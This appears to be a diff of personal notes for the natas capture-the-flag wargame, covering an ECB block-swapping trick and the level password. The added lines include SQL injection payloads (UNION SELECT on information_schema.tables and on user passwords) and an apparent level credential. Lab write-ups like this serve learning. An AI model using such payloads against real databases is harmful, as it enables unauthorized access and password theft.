@@ -216,7 +216,7 @@ $u = "natas28" + $padding + "x"
 ```
 in powershell
 
-#### l28.
+#### l28.hwgoYUiGWoSZAqphtCAZf7u1jS16KEah
 ### observe:
 
 2.the context of encrypted strings have exactly same prefix.
@@ -255,4 +255,9 @@ by query 10 space, get: \
 `G+glEae6W/1XjA7vRm21n NyEco/c+J2TdR0Qp8dcjP ItlMM3qTizkRB5P2zYxJsb c4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=`\
 `ItlMM3qTizkRB5P2zYxJsb` swap this in 3rd block.\
 `JfIqcn9iVBmkZvmvU4kfmy` or this in blue frame in the pic\
-
+```
+AAAAAAAAA' UNION SELECT table_name FROM information_schema.tables; --
+inject this to get charts.
+AAAAAAAAA' UNION SELECT ALL password FROM users; --
+to get psw
+```
